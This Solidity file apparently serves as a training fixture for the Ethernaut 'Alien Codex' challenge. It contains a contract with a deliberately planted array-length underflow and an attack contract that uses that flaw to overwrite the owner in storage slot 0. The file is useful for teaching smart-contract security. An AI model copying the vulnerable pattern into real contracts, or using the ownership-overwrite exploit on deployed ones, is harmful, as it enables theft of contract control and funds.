// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

contract EthernautAlienCodex {
    address public owner;
    bool public contact;
    bytes32[] public codex;

    constructor() {
        owner = msg.sender;
    }

    modifier contacted() {
        require(contact, "no contact");
        _;
    }

    function makeContact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        // Model the legacy underflow: force the array length to 2^256-1.
        assembly {
            sstore(codex.slot, not(0))
        }
    }

    function revise(uint256 i, bytes32 _content) public contacted {
        codex[i] = _content;
    }
}

contract AlienCodexAttack {
    function attack(EthernautAlienCodex target, address newOwner) external {
        target.makeContact();
        target.retract();
        uint256 slot = uint256(keccak256(abi.encode(uint256(1))));
        uint256 i = (2 ** 256 - 1) - slot + 1;
        target.revise(i, bytes32(uint256(uint160(newOwner))));
    }
}

// Local training fixture: retract() underflows the array length to 2^256-1,
// so an index can reach storage slot 0 and overwrite the owner.

